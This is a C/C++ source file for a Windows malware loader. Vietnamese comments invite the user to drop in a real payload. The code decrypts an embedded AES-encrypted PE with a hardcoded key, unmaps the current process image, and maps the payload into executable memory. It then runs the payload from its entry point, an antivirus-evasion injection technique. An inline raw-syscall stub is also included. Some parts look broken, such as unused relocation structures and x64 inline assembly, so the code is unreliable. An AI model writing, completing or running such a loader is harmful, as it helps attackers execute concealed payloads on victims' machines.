#include <windows.h>
#include <winternl.h>
#include <stdint.h>

#pragma comment(lib, "advapi32.lib")

typedef NTSTATUS(NTAPI* NtUnmapViewOfSection_t)(HANDLE ProcessHandle, PVOID BaseAddress);
NtUnmapViewOfSection_t NtUnmapViewOfSection;

unsigned char encrypted_payload[] = {
    /* Ví dụ mã hóa payload AES (giả định), bạn thay bằng payload thật */
    0x3A, 0x5F, 0xA1, 0x44, 0x6D, 0x92, 0x23, 0xB1,
    0xC4, 0x55, 0xD7, 0x12, 0xAA, 0xBB, 0xCC, 0xDD
};

unsigned char aes_key[32] = {
    0x60, 0x3D, 0xEB, 0x10, 0x15, 0xCA, 0x71, 0xBE,
    0x2B, 0x73, 0xAE, 0xF0, 0x85, 0x7D, 0x77, 0x81,
    0x1F, 0x35, 0x2C, 0x07, 0x3B, 0x61, 0x08, 0xD7,
    0x2D, 0x98, 0x10, 0xA3, 0x09, 0x14, 0xDF, 0xF4
};

unsigned char aes_iv[16] = {
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
};

extern "C" NTSTATUS NtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect);

extern "C" NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect);

extern "C" NTSTATUS NtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten);

typedef struct _IMAGE_RELOC {
    WORD Offset : 12;
    WORD Type : 4;
} IMAGE_RELOC, * PIMAGE_RELOC;

typedef struct _IMAGE_RELOC_BLOCK {
    DWORD PageAddress;
    DWORD BlockSize;
    IMAGE_RELOC Reloc[1];
} IMAGE_RELOC_BLOCK, * PIMAGE_RELOC_BLOCK;

void inline_syscall()
{
    __asm {
        mov eax, 0x3C   // NtTerminateProcess syscall number (ví dụ)
        mov edi, -1     // Current process handle
        xor esi, esi    // Exit status 0
        syscall
    }
}

bool DecryptAES(const unsigned char* encrypted_data, size_t encrypted_size, unsigned char* decrypted_data, size_t& decrypted_size, const unsigned char* key, const unsigned char* iv)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    DWORD result = 0;
    DWORD cbResult = 0;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) return false;

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, 32, 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    status = BCryptDecrypt(hKey, (PUCHAR)encrypted_data, (ULONG)encrypted_size, NULL, (PUCHAR)iv, 16, decrypted_data, (ULONG)decrypted_size, &cbResult, 0);

    if (BCRYPT_SUCCESS(status)) {
        decrypted_size = cbResult;
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return true;
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return false;
}

int InjectPayload(unsigned char* payload, size_t payload_size)
{
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)(payload + dos_header->e_lfanew);

    LPVOID base_address = (LPVOID)(nt_headers->OptionalHeader.ImageBase);
    SIZE_T region_size = nt_headers->OptionalHeader.SizeOfImage;

    HANDLE current_process = GetCurrentProcess();

    NtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    if (!NtUnmapViewOfSection) return -1;

    NtUnmapViewOfSection(current_process, base_address);

    LPVOID alloc_address = NULL;
    NTSTATUS status = NtAllocateVirtualMemory(current_process, &alloc_address, 0, &region_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != 0) return -2;

    memcpy(alloc_address, payload, nt_headers->OptionalHeader.SizeOfHeaders);

    PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)(payload + dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS));
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        memcpy((BYTE*)alloc_address + section[i].VirtualAddress, payload + section[i].PointerToRawData, section[i].SizeOfRawData);
    }

    DWORD old_protect = 0;
    VirtualProtect(alloc_address, nt_headers->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READ, &old_protect);

    DWORD_PTR entry_point = (DWORD_PTR)alloc_address + nt_headers->OptionalHeader.AddressOfEntryPoint;

    ((void(*)())entry_point)();

    return 0;
}

int main()
{
    size_t encrypted_size = sizeof(encrypted_payload);
    unsigned char* decrypted_payload = (unsigned char*)VirtualAlloc(NULL, 0x100000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!decrypted_payload) return -1;

    size_t decrypted_size = 0x100000;

    if (!DecryptAES(encrypted_payload, encrypted_size, decrypted_payload, decrypted_size, aes_key, aes_iv)) {
        VirtualFree(decrypted_payload, 0, MEM_RELEASE);
        return -2;
    }

    int res = InjectPayload(decrypted_payload, decrypted_size);

    VirtualFree(decrypted_payload, 0, MEM_RELEASE);

    return res;
}
